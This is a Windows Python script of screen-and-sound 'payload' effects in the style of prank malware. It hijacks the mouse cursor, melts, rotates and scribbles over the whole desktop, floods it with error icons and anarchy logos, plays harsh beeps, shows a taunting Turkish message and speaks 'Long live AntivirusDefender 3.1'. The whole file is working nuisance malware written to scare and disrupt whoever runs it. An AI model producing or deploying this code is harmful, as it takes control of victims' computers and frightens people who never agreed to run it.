import ctypes
import random
import time
import math
import winsound
import threading
import win32api
import win32con
import win32gui
from win32api import RGB
import pyttsx3  # Importing the pyttsx3 library for text-to-speech
# Constants for screen and GDI settings
SWP_NOSIZE = 0x0001
SWP_NOMOVE = 0x0002
HWND_TOPMOST = -1

# Set the window to topmost
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
user32.SetWindowPos(user32.GetForegroundWindow(), HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE)

# Screen dimensions
screen_width = user32.GetSystemMetrics(0)
screen_height = user32.GetSystemMetrics(1)

# Get desktop device context
desktop_dc = win32gui.GetDC(0)

# Global stop event
stop_event = threading.Event()
# Global stop event0
stop_event0 = threading.Event()
class XFORM(ctypes.Structure):
    _fields_ = [("eM11", ctypes.c_float),
                ("eM12", ctypes.c_float),
                ("eM21", ctypes.c_float),
                ("eM22", ctypes.c_float),
                ("eDx", ctypes.c_float),
                ("eDy", ctypes.c_float)]
def zoom_effect():
    # Zoom effect
    try:
        while  not stop_event.is_set():
            hdc = win32gui.GetDC(0)
            for i in range(90, 110):
                win32gui.StretchBlt(hdc, 0, 0, screen_width * i // 100, screen_height * i // 100, hdc, 0, 0, screen_width, screen_height, win32con.SRCCOPY)
                time.sleep(0.02)
    except Exception as e:
        print(f"Error in zoom_effect: {e}")
# Function to move mouse randomly
def move_mouse_randomly():
    try:
        while not stop_event.is_set():
            x = random.randint(0, screen_width)
            y = random.randint(0, screen_height)
            win32api.SetCursorPos((x, y))
            time.sleep(0.01)
    except Exception as e:
        print(f"Error in move_mouse_randomly: {e}")

# This function takes a stop_event to manage when to stop the effect
def zigzag_effect():
    # Line length and angle for zigzag pattern
    line_length = 100
    angle = 90  # Start with 90 degrees for the zigzag effect
    delay = 0.05
    
    # Assuming screen dimensions are defined elsewhere in your script
    screen_width = 1920
    screen_height = 1080

    # Starting point in the middle of the screen height
    x, y = 0, screen_height // 2

    try:
        while not stop_event.is_set():
            # Get the device context of the screen
            hdc = win32gui.GetDC(0)
            
            for i in range(screen_width // line_length):
                if stop_event.is_set():
                    break
                
                # Calculate the end point of the line
                x_end = x + line_length * math.cos(math.radians(angle))
                y_end = y + line_length * math.sin(math.radians(angle))
                
                # Create a red color pen
                color = RGB(255, 0, 0)
                pen = win32gui.CreatePen(win32con.PS_SOLID, 2, color)
                win32gui.SelectObject(hdc, pen)
                
                # Draw the line
                win32gui.MoveToEx(hdc, int(x), int(y))
                win32gui.LineTo(hdc, int(x_end), int(y_end))
                
                # Update the starting point for the next line
                x, y = x_end, y_end
                
                # Alternate the angle to create a zigzag pattern
                angle = -angle
                
                # Clean up the pen
                win32gui.DeleteObject(pen)
                
                # Play a loud or jarring sound effect
                winsound.Beep(random.choice([500, 1000, 1500]), random.choice([50, 100, 150]))
                
                # Introduce a short delay
                time.sleep(delay)
            
            # Release the device context
            win32gui.ReleaseDC(0, hdc)
    except Exception as e:
        # Handle the exception appropriately (e.g., log the error)
        print(f"Error in zigzag_effect: {e}")

# Define additional functions for various effects
def shape_effect():
    try:
        for _ in range(1000):
            if stop_event.is_set():
                break
            
            x = random.randint(0, screen_width)
            y = random.randint(0, screen_height)
            width = random.randint(10, 100)
            height = random.randint(10, 100)
            
            color = RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            
            brush = gdi32.CreateSolidBrush(color)
            
            if random.random() < 0.5:
                region = gdi32.CreateRectRgn(x - width // 2, y - height // 2, x + width // 2, y + height // 2)
            else:
                region = gdi32.CreateEllipticRgn(x - width // 2, y - height // 2, x + width // 2, y + height // 2)
            
            gdi32.FillRgn(desktop_dc, region, brush)
            
            gdi32.DeleteObject(region)
            gdi32.DeleteObject(brush)
            
            winsound.Beep(1000, 100)
            
            draw_text("Bok yazilimi yedin gecmis olsun", x, y)

            time.sleep(0.02)
    except Exception as e:
        print(f"Error in shape_effect: {e}")

def draw_text(text, x, y, font_size=36, font_face="Arial", font_weight=700):
    try:
        hdc = win32gui.GetDC(0)
        font = gdi32.CreateFontW(-font_size, 0, 0, 0, font_weight, 0, 0, 0, 0, 0, 0, 0, 0, font_face)
        old_font = gdi32.SelectObject(hdc, font)
        gdi32.TextOutW(hdc, x, y, text, len(text))
        gdi32.SelectObject(hdc, old_font)
        gdi32.DeleteObject(font)
        win32gui.ReleaseDC(0, hdc)
    except Exception as e:
        print(f"Error drawing text: {e}")

# Additional effect functions

def sines():
    try:
        hdc = win32gui.GetWindowDC(user32.GetDesktopWindow())
        sw = user32.GetSystemMetrics(0)
        sh = user32.GetSystemMetrics(1)
        angle = 0
        
        while not stop_event.is_set():
            hdc = win32gui.GetWindowDC(user32.GetDesktopWindow())
            for i in range(int(sw + sh)):
                if stop_event.is_set():
                    break
                
                a = int(math.sin(angle) * 20) 
                win32gui.BitBlt(hdc, 0, i, sw, 1, hdc, a, i, win32con.SRCCOPY)
                angle += math.pi / 40
            win32gui.ReleaseDC(user32.GetDesktopWindow(), hdc)
            time.sleep(0.01)
    except Exception as e:
        print(f"Error in sines: {e}")

def move_icons():
    try:
        [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
        x = y = 0
        while not stop_event.is_set():
            hdc = win32gui.GetDC(0)
            win32gui.DrawIcon(hdc, x, y, win32gui.LoadIcon(None, win32con.IDI_ERROR))
            x += 30
            if x >= w:
                y += 30
                x = 0
            if y >= h:
                x = y = 0
            time.sleep(0.1)
    except Exception as e:
        print(f"Error in move_icons: {e}")

def rotate_bitblt():
    try:
        user32.SetProcessDPIAware()
        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
        hdc = win32gui.GetDC(0)
        dx = dy = 1
        angle = 0
        size = 1
        speed = 5
        
        while not stop_event.is_set():
            win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, win32con.SRCAND)
            dx = math.ceil(math.sin(angle) * size * 10)
            dy = math.ceil(math.cos(angle) * size * 10)
            angle += speed / 10
            if angle > math.pi:
                angle = math.pi * -1
            time.sleep(0.1)
    except Exception as e:
        print(f"Error in rotate_bitblt: {e}")

def draw_random_rectangles():
    try:
        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
        while not stop_event.is_set():
            hdc = win32gui.GetDC(0)
            color = RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            brush = win32gui.CreateSolidBrush(color)
            win32gui.SelectObject(hdc, brush)
            win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.SRCCOPY)
            win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)
            win32gui.DeleteObject(brush)
            win32gui.ReleaseDC(0, hdc)
            time.sleep(0.1)
    except Exception as e:
        print(f"Error in draw_random_rectangles: {e}")

def melting_effect():
    try:
        user32.SetProcessDPIAware()
        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
        while not stop_event.is_set():
            hdc = win32gui.GetDC(0)
            win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, 0, -10, win32con.SRCCOPY)
            win32gui.ReleaseDC(0, hdc)
            time.sleep(0.02)
    except Exception as e:
        print(f"Error in melting_effect: {e}")

def rotate_screen():
    try:
        user32.SetProcessDPIAware()
        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
        angle = 0
        
        while not stop_event.is_set():
            hdc = win32gui.GetDC(0)
            x_center = sw // 2
            y_center = sh // 2
            
            # Define transformation matrix
            matrix = XFORM()
            matrix.eM11 = math.cos(math.radians(angle))
            matrix.eM12 = -math.sin(math.radians(angle))
            matrix.eM21 = math.sin(math.radians(angle))
            matrix.eM22 = math.cos(math.radians(angle))
            
            # Apply transformation matrix
            gdi32.ModifyWorldTransform(hdc, ctypes.byref(matrix), win32con.MWT_LEFTMULTIPLY)
            
            win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, win32con.SRCCOPY)
            
            # Reset transformation
            gdi32.ModifyWorldTransform(hdc, None, win32con.MWT_IDENTITY)
            
            angle += 1
            if angle >= 360:
                angle = 0
                
            win32gui.ReleaseDC(0, hdc)
            time.sleep(0.02)
    except Exception as e:
        print(f"Error in rotate_screen: {e}")

# Define sound functions

def play_random_sound():
    try:
        while not stop_event.is_set():
            frequency = random.choice([500, 1000, 1500])
            duration = random.choice([50, 100, 150])
            winsound.Beep(frequency, duration)
            time.sleep(0.02)
    except Exception as e:
        print(f"Error in play_random_sound: {e}")

def more_sounds():
    try:
        while not stop_event.is_set():
            winsound.Beep(1500, 100)
            time.sleep(0.1)
    except Exception as e:
        print(f"Error in more_sounds: {e}")

def warning_logos():
    try:
        [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
        x = y = 0
        while not stop_event.is_set():
            hdc = win32gui.GetDC(0)
            win32gui.DrawIcon(hdc, x, y, win32gui.LoadIcon(None, win32con.IDI_WARNING))
            x += 30
            if x >= w:
                y += 30
                x = 0
            if y >= h:
                x = y = 0
            time.sleep(0.1)
    except Exception as e:
        print(f"Error in warning_logos: {e}")

def info_logos():
    try:
        [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
        x = y = 0
        while not stop_event.is_set():
            hdc = win32gui.GetDC(0)
            win32gui.DrawIcon(hdc, x, y, win32gui.LoadIcon(None, win32con.IDI_INFORMATION))
            x += 30
            if x >= w:
                y += 30
                x = 0
            if y >= h:
                x = y = 0
            time.sleep(0.1)
    except Exception as e:
        print(f"Error in info_logos: {e}")

# Main function to run effects
def run_initial_effects():
    print("Starting initial effects...")

    # List of initial functions
    functions = [
        move_mouse_randomly,
        shape_effect,
        sines,
        move_icons,
        rotate_bitblt,
        draw_random_rectangles,
        melting_effect,
        rotate_screen,
        more_sounds,
        zoom_effect,
        play_random_sound,
        warning_logos,
        info_logos,
    ]

    # Create and start threads for each function
    threads = []
    for func in functions:
        thread = threading.Thread(target=func)
        thread.start()
        threads.append(thread)

    # Wait for 30 seconds
    time.sleep(30)

    # Signal all threads to stop
    stop_event.set()
    print("Initial effects stopped.")
def scary_sounds():
    # This function will run indefinitely as long as the stop event is not set
    while not stop_event0.is_set():
        # Randomly decide the type of scary sound to play
        sound_type = random.choice(['fast_beep', 'creepy_noise', 'fast_sequence', 'rapid_modulation', 'haunting'])

        if sound_type == 'fast_beep':
            # Play a series of very fast beeps with varying frequencies and durations
            for _ in range(random.randint(10, 20)):
                frequency = random.choice([100, 500, 1000, 2000, 3000, 4000, 6000, 8000])
                duration = random.choice([10, 20, 30])  # Very short durations
                winsound.Beep(frequency, duration)
                time.sleep(random.uniform(0.01, 0.05))  # Very short sleep intervals
        
        elif sound_type == 'creepy_noise':
            # Play a low-frequency sound with variation in volume
            frequency = random.randint(50, 300)
            duration = random.choice([200, 500, 1000])  # Longer durations for creepiness
            for _ in range(random.randint(5, 10)):
                winsound.Beep(frequency, duration)
                # Sleep between beeps to create a creepy rhythm
                time.sleep(random.uniform(0.1, 0.5))
        
        elif sound_type == 'fast_sequence':
            # Play a fast sequence of beeps with increasing or decreasing frequencies
            start_frequency = random.choice([200, 400, 800, 1200])
            step = random.choice([-100, 100, 200, 400])
            for i in range(10):
                frequency = start_frequency + (i * step)
                if frequency < 100 or frequency > 8000:
                    break
                duration = random.choice([10, 20])
                winsound.Beep(frequency, duration)
                time.sleep(random.uniform(0.01, 0.03))
        
        elif sound_type == 'rapid_modulation':
            # Create a rapidly modulated sound by alternating frequencies quickly
            base_frequency = random.choice([300, 600, 900, 1200])
            mod_frequency = random.choice([20, 40, 60])
            for _ in range(10):
                frequency = base_frequency + random.choice([-mod_frequency, mod_frequency])
                duration = random.choice([10, 20])
                winsound.Beep(frequency, duration)
                time.sleep(random.uniform(0.01, 0.05))
        
        elif sound_type == 'haunting':
            # Play haunting sounds with lower frequency and longer duration
            frequency = random.randint(100, 500)
            duration = random.choice([500, 1000, 2000])  # Longer durations for haunting effect
            winsound.Beep(frequency, duration)
            # Introduce some unexpected delays to keep the user on edge
            time.sleep(random.uniform(0.5, 2.0))
        
        # Random sleep interval between different sounds
        sleep_time = random.uniform(0.2, 0.7)  # Sleep times between sound effects
        time.sleep(sleep_time)
def screen_crack():
    # Define crack attributes
    crack_color = RGB(255, 255, 255)  # White color
    crack_thickness = 2  # Thickness of crack lines
    
    # Get a global device context for the entire screen
    hdc = win32gui.GetDC(0)
    
    try:
        # Continuously draw cracks across the screen while the stop event is not set
        while not stop_event0.is_set():
            # Get screen metrics using user32 library
            screen_width = user32.GetSystemMetrics(0)
            screen_height = user32.GetSystemMetrics(1)
            
            # Draw cracks across the screen
            for _ in range(random.randint(3, 5)):
                # Random starting point of the crack
                start_x = random.randint(0, screen_width)
                start_y = random.randint(0, screen_height)
                
                # Set the starting point
                x, y = start_x, start_y
                
                # Create a pen for drawing cracks
                pen = win32gui.CreatePen(win32con.PS_SOLID, crack_thickness, crack_color)
                win32gui.SelectObject(hdc, pen)
                
                # Draw the main crack
                for _ in range(screen_height // crack_thickness):
                    # Determine the direction and length of the crack segment
                    angle = random.uniform(0, 2 * math.pi)
                    segment_length = random.randint(10, 50)
                    
                    # Calculate end point of the crack segment
                    x_end = x + int(segment_length * math.cos(angle))
                    y_end = y + int(segment_length * math.sin(angle))
                    
                    # Draw the crack segment using MoveToEx and LineTo
                    win32gui.MoveToEx(hdc, int(x), int(y))
                    win32gui.LineTo(hdc, int(x_end), int(y_end))
                    
                    # Update starting point for the next segment
                    x, y = x_end, y_end
                    
                    # Optional: Add smaller fractures branching off from the main crack
                    if random.random() < 0.2:
                        # Define a branching angle
                        branch_angle = angle + random.uniform(-math.pi / 4, math.pi / 4)
                        branch_length = random.randint(10, 30)
                        
                        # Calculate end point of the branch
                        branch_x_end = x + int(branch_length * math.cos(branch_angle))
                        branch_y_end = y + int(branch_length * math.sin(branch_angle))
                        
                        # Draw the branch using MoveToEx and LineTo
                        win32gui.MoveToEx(hdc, int(x), int(y))
                        win32gui.LineTo(hdc, int(branch_x_end), int(branch_y_end))
                
                # Clean up the pen
                win32gui.DeleteObject(pen)
            
            # Introduce a short delay
            time.sleep(0.5)
    
    except Exception as e:
        print(f"Error in screen_crack: {e}")
    finally:
        # Always release the device context
        win32gui.ReleaseDC(0, hdc)

# Function to play sound from text
def play_sound_from_text():
    engine = pyttsx3.init()
    text = "Rebcoana is dead. Long live AntivirusDefender 3.1"
    engine.say(text)
    engine.runAndWait()

def bomb_effect():
    # Define constants for bomb effect
    max_radius = 200  # Maximum radius of the explosion
    expansion_speed = 5  # Speed at which the explosion expands
    delay = 0.1  # Time delay between each drawing step (in seconds)

    # Get a global device context for the entire screen
    hdc = win32gui.GetDC(0)

    # Get screen dimensions
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)

    try:
        # Main loop to continuously create bomb explosions
        while not stop_event0.is_set():
            # Choose a random center point for the explosion
            center_x = random.randint(0, screen_width)
            center_y = random.randint(0, screen_height)

            # Choose a random color for the explosion
            color = RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            # Create a pen for drawing the explosion circles
            pen = win32gui.CreatePen(win32con.PS_SOLID, 2, color)
            win32gui.SelectObject(hdc, pen)

            # Draw expanding circles to simulate an explosion
            for radius in range(0, max_radius + 1, expansion_speed):
                # Draw a circle using the ellipse function
                win32gui.Ellipse(hdc, center_x - radius, center_y - radius, center_x + radius, center_y + radius)
                
                # Introduce a short delay between each expansion step
                time.sleep(delay)

            # Clean up the pen
            win32gui.DeleteObject(pen)

            # Introduce a delay before starting the next explosion
            time.sleep(0.5)

    except Exception as e:
        print(f"Error in bomb_effect: {e}")
    finally:
        # Always release the device context
        win32gui.ReleaseDC(0, hdc)
def zigzag():
    # Define line length and angle for the zigzag pattern
    line_length = 50  # Length of each zigzag line
    angle = 45  # Initial angle for the zigzag pattern
    delay = 0.05  # Time delay between each drawing step (in seconds)
    
    # Starting point in the middle of the screen height
    x, y = 0, user32.GetSystemMetrics(1) // 2
    
    # Get a global device context
    hdc = win32gui.GetDC(0)
    
    try:
        # Main zigzag effect loop
        while not stop_event0.is_set():
            # Draw zigzag pattern across the entire screen width
            while x < user32.GetSystemMetrics(0):
                if stop_event0.is_set():
                    break
                
                # Calculate end point of the line
                x_end = x + int(line_length * math.cos(math.radians(angle)))
                y_end = y + int(line_length * math.sin(math.radians(angle)))
                
                # Create a random color for the zigzag line
                color = RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
                
                # Create a pen for drawing the zigzag line
                pen = win32gui.CreatePen(win32con.PS_SOLID, 2, color)
                win32gui.SelectObject(hdc, pen)
                
                # Draw the line using `win32gui.MoveToEx()` and `win32gui.LineTo()`
                win32gui.MoveToEx(hdc, int(x), int(y))
                win32gui.LineTo(hdc, int(x_end), int(y_end))
                
                # Alternate the angle to create a zigzag pattern
                angle = -angle
                
                # Update the starting point for the next line
                x, y = x_end, y_end
                
                # Clean up the pen
                win32gui.DeleteObject(pen)
                
                # Introduce a short delay
                time.sleep(delay)
                
            # Reset the x-coordinate for continuous drawing across the screen
            x = 0
            
            # Delay to allow the effect to repeat continuously
            time.sleep(0.5)
    
    except Exception as e:
        print(f"Error in zigzag: {e}")
    finally:
        # Always release the device context
        win32gui.ReleaseDC(0, hdc)
def screen_cut():
    # Define the cut attributes
    line_thickness = 5  # Thickness of the cut lines
    line_color = RGB(255, 0, 0)  # Red color for the cut lines
    
    # Get a global device context for the entire screen
    hdc = win32gui.GetDC(0)
    
    try:
        # Continuously draw cuts across the screen while the stop event is not set
        while not stop_event0.is_set():
            # Draw cuts across the screen from top-left to bottom-right
            for _ in range(5):  # Number of cuts
                # Calculate the start and end points for the cut lines
                start_x = random.randint(0, screen_width)
                start_y = random.randint(0, screen_height)
                end_x = start_x + random.randint(-200, 200)
                end_y = start_y + random.randint(-200, 200)
                
                # Create a pen for drawing the cut lines
                pen = win32gui.CreatePen(win32con.PS_SOLID, line_thickness, line_color)
                win32gui.SelectObject(hdc, pen)
                
                # Draw the cut line from start to end point
                win32gui.MoveToEx(hdc, start_x, start_y)
                win32gui.LineTo(hdc, end_x, end_y)
                
                # Clean up the pen
                win32gui.DeleteObject(pen)
                
            # Introduce a delay between each iteration
            time.sleep(0.5)
    
    except Exception as e:
        print(f"Error in screen_cut: {e}")
    finally:
        # Always release the device context
        win32gui.ReleaseDC(0, hdc)
# Function to create a visual effect on the screen
def spiral_effect():
    # Get device context for the screen
    hdc = win32gui.GetDC(0)
    
    # Get screen dimensions
    user32 = ctypes.windll.user32
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    
    # Set the effect duration and delay
    effect_duration = 10  # seconds
    delay = 0.01  # seconds between each frame
    
    # Define the spiral parameters
    angle = 0  # Starting angle in degrees
    max_angle = 360 * 5  # Maximum angle to complete the spiral effect
    radius = 10  # Initial radius
    max_radius = min(screen_width, screen_height) / 4  # Maximum spiral radius
    
    # Define the increment steps for angle and radius
    angle_step = 10  # Degrees per frame
    radius_step = 1  # Pixels per frame
    
    # Randomize the color
    color = RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    
    # Create a pen for drawing the spiral
    pen = win32gui.CreatePen(win32con.PS_SOLID, 2, color)
    win32gui.SelectObject(hdc, pen)
    
    # Calculate the center of the screen
    center_x = screen_width // 2
    center_y = screen_height // 2
    
    start_time = time.time()
    
    try:
        # Draw the spiral effect
        while not stop_event0.is_set() and (time.time() - start_time) < effect_duration:
            # Calculate the current position of the spiral
            x = center_x + int(radius * math.cos(math.radians(angle)))
            y = center_y + int(radius * math.sin(math.radians(angle)))
            
            # Draw a point at the calculated position
            win32gui.SetPixel(hdc, x, y, color)
            
            # Increment the angle and radius for the next frame
            angle += angle_step
            radius += radius_step
            
            # Check if the maximum angle or radius is reached, then stop the effect
            if angle >= max_angle or radius >= max_radius:
                break
            
            # Introduce a delay between each frame
            time.sleep(delay)
    
    except Exception as e:
        print(f"Error in spiral_effect: {e}")
    
    finally:
        # Clean up the pen and release the device context
        win32gui.DeleteObject(pen)
        win32gui.ReleaseDC(0, hdc)

# Function to draw a sharp letter "A" inside a circle with a diagonal line crossing through the center
def draw_anarchy_logo():
    # Get device context for the screen
    hdc = win32gui.GetDC(0)
    
    # Get screen dimensions
    user32 = ctypes.windll.user32
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    
    # Define the size of the logo
    logo_radius = 50  # Radius of the circle
    line_thickness = 2  # Thickness of the lines for a sharp "A"
    
    # Create a pen with red color
    color = RGB(255, 0, 0)
    pen = win32gui.CreatePen(win32con.PS_SOLID, line_thickness, color)
    win32gui.SelectObject(hdc, pen)
    
    try:
        while not stop_event0.is_set():  # Infinite loop to keep drawing logos everywhere
            # Randomly choose a center point for the logo
            center_x = random.randint(logo_radius, screen_width - logo_radius)
            center_y = random.randint(logo_radius, screen_height - logo_radius)
            
            # Draw the circle part of the Anarchy logo
            win32gui.Ellipse(hdc, center_x - logo_radius, center_y - logo_radius,
                             center_x + logo_radius, center_y + logo_radius)
            
            # Calculate coordinates for the letter "A" within the circle
            # Starting points at the base of the "A"
            base_width = 0.8 * logo_radius  # Width of the base of the "A"
            start_x1 = center_x - base_width / 2
            start_y1 = center_y + logo_radius
            
            start_x2 = center_x + base_width / 2
            start_y2 = center_y + logo_radius
            
            # Apex point of the "A" (top of the triangle)
            apex_x = center_x
            apex_y = center_y - logo_radius
            
            # Midpoint of the horizontal bar in the "A"
            bar_y = center_y
            
            # Draw the two lines forming the "A"
            # Line from base to apex on the left side
            win32gui.MoveToEx(hdc, int(start_x1), int(start_y1))
            win32gui.LineTo(hdc, int(apex_x), int(apex_y))
            
            # Line from base to apex on the right side
            win32gui.MoveToEx(hdc, int(start_x2), int(start_y2))
            win32gui.LineTo(hdc, int(apex_x), int(apex_y))
            
            # Draw the horizontal bar in the "A"
            bar_start_x = center_x - base_width / 4
            bar_end_x = center_x + base_width / 4
            win32gui.MoveToEx(hdc, int(bar_start_x), int(bar_y))
            win32gui.LineTo(hdc, int(bar_end_x), int(bar_y))
            
            # Draw the diagonal line crossing through the center of the circle and the "A"
            diag_start_x = center_x - logo_radius
            diag_start_y = center_y
            diag_end_x = center_x + logo_radius
            diag_end_y = center_y
            
            # Draw the diagonal line
            win32gui.MoveToEx(hdc, int(diag_start_x), int(diag_start_y))
            win32gui.LineTo(hdc, int(diag_end_x), int(diag_end_y))
            
            # Wait for a random amount of time before drawing the next logo
            time.sleep(random.uniform(0.2, 0.7))
        
    except Exception as e:
        print(f"Error in draw_anarchy_logo_everywhere: {e}")
    finally:
        # Clean up the pen
        win32gui.DeleteObject(pen)
        # Release device context
        win32gui.ReleaseDC(0, hdc)
# Main function to run zigzag effect
def run_zigzag_effect():
    # Create threads for each effect
    zigzag_thread = threading.Thread(target=zigzag)
    scary_sounds_thread = threading.Thread(target=scary_sounds)
    screen_crack_thread = threading.Thread(target=screen_crack)
    play_sound_thread = threading.Thread(target=play_sound_from_text)
    bomb_effect_thread = threading.Thread(target=bomb_effect)
    screen_cut_thread = threading.Thread(target=screen_cut)
    spiral_effect_thread = threading.Thread(target=spiral_effect)  # Add spiral effect thread
    logo_thread = threading.Thread(target=draw_anarchy_logo)
    zigzag0_thread = threading.Thread(target=zigzag_effect)

    # Start the threads
    zigzag_thread.start()
    scary_sounds_thread.start()
    screen_crack_thread.start()
    play_sound_thread.start()
    bomb_effect_thread.start()
    screen_cut_thread.start()
    spiral_effect_thread.start()  # Start the spiral effect thread
    logo_thread.start()
    zigzag0_thread.start()
    time.sleep(30)
    stop_event0.set()
# Entry point of the script
if __name__ == "__main__":
    try:
        # Run the initial effects for 30 seconds and wait for them to finish
        run_initial_effects()

        # Reset the stop event
        stop_event.clear()

        # Start the zigzag effect
        run_zigzag_effect()
        
    except Exception as e:
        print(f"An error occurred: {e}")